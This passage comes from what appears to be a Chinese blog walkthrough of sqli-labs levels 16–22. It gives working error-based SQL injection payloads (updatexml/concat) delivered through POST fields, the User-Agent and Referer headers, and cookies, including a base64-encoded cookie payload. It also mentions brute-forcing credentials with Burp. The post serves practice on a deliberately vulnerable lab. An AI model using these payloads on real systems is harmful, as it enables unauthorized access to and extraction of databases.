src="image-20210219011737775.png" alt="image-20210219011737775"></p><p>成功后响应时间变长</p><p>1’ and updatexml(1,concat(0x7e,(select @@version()),0x7e),1)#</p><h3 id="Less16：POST布尔-时间盲注-带双引号"><a href="#Less16：POST布尔-时间盲注-带双引号" class="headerlink" title="Less16：POST布尔&#x2F;时间盲注(带双引号)"></a>Less16：POST布尔&#x2F;时间盲注(带双引号)</h3><p>lesss14中的盲注脚本即可</p><h3 id="Less17：update"><a href="#Less17：update" class="headerlink" title="Less17：update"></a>Less17：update</h3><p>这一关难搞，试了半天的username，打开后台一瞅，好家伙全是转义。。。</p><p>如其名，猜测就是更新数据的，所以试一试updatexml，成了。</p><p>payload：<code>1&#39; and updatexml(1,concat(0x7e,(select version()),0x7e),1)#</code></p><p><img src="image-20210219122421671.png" alt="image-20210219122421671"></p><p>需要注意的是，既然是更新信息，那么所选择的username在数据库中要存在</p><h3 id="Less18：http-useragent注入"><a href="#Less18：http-useragent注入" class="headerlink" title="Less18：http-useragent注入"></a>Less18：http-useragent注入</h3><p>这一关要先知道账号密码，可以使用brup进行爆破得到，然后进行UA注入</p><p>payload：<code> &#39;and  updatexml(1,concat(0x7e,@@version,0x7e),1) or &#39;1&#39;=&#39;1</code></p><p>这里不直接注释掉是因为后台是先进行插入，再显示出来的。</p><p><img src="image-20210219164225757.png" alt="image-20210219164225757"></p><h3 id="Less19：http-refer注入"><a href="#Less19：http-refer注入" class="headerlink" title="Less19：http-refer注入"></a>Less19：http-refer注入</h3><p>和less18一样，在refer进行注入</p><p><img src="image-20210219164503461.png" alt="image-20210219164503461"></p><h3 id="Less20：cooike注入"><a href="#Less20：cooike注入" class="headerlink" title="Less20：cooike注入"></a>Less20：cooike注入</h3><p>找个账号登进去</p><p><img src="image-20210219173109251.png" alt="image-20210219173109251"></p><p>抓包修改cooike：<code>uname=admin&#39; and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)#</code></p><h3 id="less21：cookie-base64（带括号的单引号）"><a href="#less21：cookie-base64（带括号的单引号）" class="headerlink" title="less21：cookie-base64（带括号的单引号）"></a>less21：cookie-base64（带括号的单引号）</h3><p>瞅瞅，base64加密了，简单嘛，把上一关的payloadbase64一下就o了</p><p><img src="image-20210219181040717.png" alt="image-20210219181040717"></p><p>先试试闭合</p><p>尝试各种闭合之后发现<code>1&#39;) #</code>不会报错</p><p>payload：<code>uname=YWRtaW4xJylhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKFNFTEVDVCBkYXRhYmFzZSgpKSwweDdlKSwxKSM=</code></p><p><img src="image-20210219185850820.png" alt="image-20210219185850820"></p><p>建议加解密到此网站：<a href="https://tool.oschina.net/encrypt?type=3%EF%BC%8C%E8%B8%A9%E4%BA%86%E5%BE%88%E5%A4%9A%E5%9D%91%E3%80%82%E3%80%82%E3%80%82">https://tool.oschina.net/encrypt?type=3，踩了很多坑。。。</a></p><h3 id="less22：cookie-base64（双引号）"><a href="#less22：cookie-base64（双引号）" class="headerlink" title="less22：cookie-base64（双引号）"></a>less22：cookie-base64（双引号）</h3><p>经过实验和less21只是闭合不一样，换成双引号就好了</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
